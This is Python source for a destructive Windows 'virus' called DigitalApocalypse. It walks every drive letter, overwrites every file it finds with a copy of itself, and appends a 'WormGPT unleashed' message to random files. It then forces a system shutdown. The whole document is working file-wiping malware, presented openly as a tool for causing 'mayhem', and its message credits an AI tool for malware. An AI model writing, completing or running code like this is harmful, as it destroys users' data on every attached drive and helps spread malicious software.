
####################################
# DigitalApocalypse
# Author: 1cYinfinity
# License: MIT License
####################################

import os
import sys
import shutil
import random
import ctypes

def spread_mayhem():
    try:
        # Copy the virus to all available drives, including system drives
        virus_path = sys.argv[0]
        drives = ['A:', 'B:', 'C:', 'D:', 'E:', 'F:', 'G:', 'H:', 'I:', 'J:', 'K:', 'L:', 'M:', 'N:', 'O:', 'P:', 'Q:', 'R:', 'S:', 'T:', 'U:', 'V:', 'W:', 'X:', 'Y:', 'Z:']
        system_drive = os.getenv('SystemDrive')

        if system_drive not in drives:
            drives.append(system_drive)

        for drive in drives:
            for root, dirs, files in os.walk(drive):
                for file in files:
                    file_path = os.path.join(root, file)
                    shutil.copy(virus_path, file_path)

        # Modify random files to trigger chaos on all drives
        num_corruptions = random.randint(20, 30)
        for _ in range(num_corruptions):
            target_drive = random.choice(drives)
            target_file = random.choice(os.listdir(target_drive))
            file_path = os.path.join(target_drive, target_file)

            with open(file_path, 'a') as f:
                f.write("WormGPT unleashed enhanced chaos on all drives!")

        # Bonus: Trigger system shutdown on infected machines
        ctypes.windll.kernel32.ExitWindowsEx(0x00000008, 0x00000004)

        print("Rampaging virus now unleashing unparalleled chaos and power across all drives!")

    except Exception as e:
        print(f"Error: {e}")

# Call the function to initiate widespread mayhem
spread_mayhem()
